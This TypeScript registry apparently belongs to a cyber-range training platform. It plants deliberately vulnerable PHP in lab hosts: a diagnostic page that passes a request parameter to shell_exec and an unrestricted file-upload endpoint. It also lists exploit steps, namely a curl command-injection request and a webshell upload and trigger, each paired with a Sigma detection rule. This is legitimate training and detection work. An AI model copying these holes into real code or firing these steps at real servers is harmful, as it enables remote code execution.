// SPDX-License-Identifier: Apache-2.0
import type { PlantedVuln } from "@musearena/shared";

/**
 * Vulnerable-target registry (the CVE training substrate).
 *
 * Each entry names a real vulnerability that the configurator can plant at a
 * PINNED vulnerable version, a multi-step exploit that proves it is
 * exploitable (run by the gate executor before an exercise counts), and the
 * Sigma rule blue must match to detect it. Entries are curated and
 * gate-verified: the platform never claims a CVE it cannot fire.
 *
 * Rules for adding an entry:
 * 1. The planted version must be the vulnerable one; never silently
 *    substitute a patched build. `install` may assert the version.
 * 2. The exploit must produce an observable telemetry line in `proofLog`
 *    (the marker), not just an exit code.
 * 3. A Sigma rule with the same id must exist in backend/detections/.
 * 4. `techniqueId` is the ATT&CK technique the exercise scores against.
 *
 * Exploit step templates may use {host} (the target as reachable from the
 * executor's vantage: 127.0.0.1 in-guest, the host id from the attacker
 * container) and {marker} (the per-run proof marker).
 */

export interface VulnTarget {
  /** PlantedVuln id this target answers to (also the Sigma rule id). */
  id: string;
  cveId: string;
  /** One-line description shown in design output. */
  summary: string;
  /** Guest family this installs on. */
  os: "Debian 12";
  /** Host role the service runs on. */
  role: "web";
  /** ATT&CK technique the exploit exercises. */
  techniqueId: string;
  /** The vulnerable version string the install task asserts. */
  vulnerableVersion: string;
  /** Shell tasks (Ansible raw) run at configure time before the app files. */
  install: string[];
  /** Vulnerable application files planted onto the host. */
  files: { path: string; body: string }[];
  /** Exploit steps (shell), run in order by the proof executor. */
  exploitSteps: string[];
  /** Log the proof marker is observed in (tailed by the executor). */
  proofLog: string;
}

/** A faithful minimal reproduction of the CVE-2018-9205 upload endpoint. */
const UPLOAD_APP: { path: string; body: string }[] = [
  {
    path: "/var/www/html/upload.php",
    body: `<?php
// CVE-2018-9205 class: unauthenticated arbitrary file upload.
// The vulnerable version accepts any file type without validation.
if (!is_dir(__DIR__ . '/uploads')) @mkdir(__DIR__ . '/uploads', 0777, true);
foreach ($_FILES['files']['tmp_name'] ?? [] as $i => $tmp) {
  $name = basename($_FILES['files']['name'][$i]);
  @move_uploaded_file($tmp, __DIR__ . "/uploads/$name");
}
echo "ok\\n";
`,
  },
];

export const VULN_TARGETS: VulnTarget[] = [
  {
    id: "cve-web-php-diag-rce",
    cveId: "CLASS-PHP-PARAM-RCE",
    summary: "PHP diagnostic page passes a request parameter to shell_exec (parameter-injection RCE class)",
    os: "Debian 12",
    role: "web",
    techniqueId: "T1059",
    vulnerableVersion: "diag-1.0",
    install: ["test -d /var/www/html"],
    files: [{
      path: "/var/www/html/diag.php",
      body: `<?php $h = $_GET['host'] ?? 'localhost'; echo "<pre>" . shell_exec("getent hosts " . $h) . "</pre>";\n`,
    }],
    exploitSteps: [
      `curl -s -o /dev/null --max-time 20 "http://{host}/diag.php?host=x%3Becho%20{marker}%201%3E%262"`,
    ],
    proofLog: "sudo -n tail -n 200 /var/log/apache2/error.log",
  },
  {
    id: "cve-2018-9205-jquery-file-upload",
    cveId: "CVE-2018-9205",
    summary: "Unauthenticated arbitrary file upload (blueimp jQuery File Upload <= 9.22.0 class) → webshell execution",
    os: "Debian 12",
    role: "web",
    techniqueId: "T1190",
    vulnerableVersion: "upload-9.22.0",
    install: [
      "test -d /var/www/html",
      "mkdir -p /var/www/html/uploads && chmod 777 /var/www/html/uploads",
    ],
    files: UPLOAD_APP,
    exploitSteps: [
      `printf '<?php error_log("{marker}"); ?>' > /tmp/x.php`,
      `curl -s -o /dev/null --max-time 20 -F "files[]=@/tmp/x.php" "http://{host}/upload.php"`,
      `curl -s -o /dev/null --max-time 20 "http://{host}/uploads/x.php"`,
      `rm -f /tmp/x.php`,
    ],
    proofLog: "sudo -n tail -n 200 /var/log/apache2/error.log",
  },
];

export function vulnTargetFor(vuln: { id: string; pinnedVersion: string }): VulnTarget | undefined {
  // Targets are addressed by PlantedVuln.id, or by the pinned version when
  // the designer mints its own id; both lookups are exact.
  return VULN_TARGETS.find((t) => t.id === vuln.id || t.vulnerableVersion === vuln.pinnedVersion || t.id === vuln.pinnedVersion);
}

/** Bind an exploit step: substitute the vantage host and the proof marker. */
export function bindStep(step: string, host: string, marker: string): string {
  return step.replaceAll("{host}", host).replaceAll("{marker}", marker);
}

/** Text for the designer prompt: the CVE targets the runtime can plant and prove. */
export function vulnTargetCatalogText(): string {
  if (!VULN_TARGETS.length) return "";
  return VULN_TARGETS.map((t) => `- ${t.id} (${t.cveId}, ${t.techniqueId}, role ${t.role}): ${t.summary}`).join("\n");
}

export type { PlantedVuln };
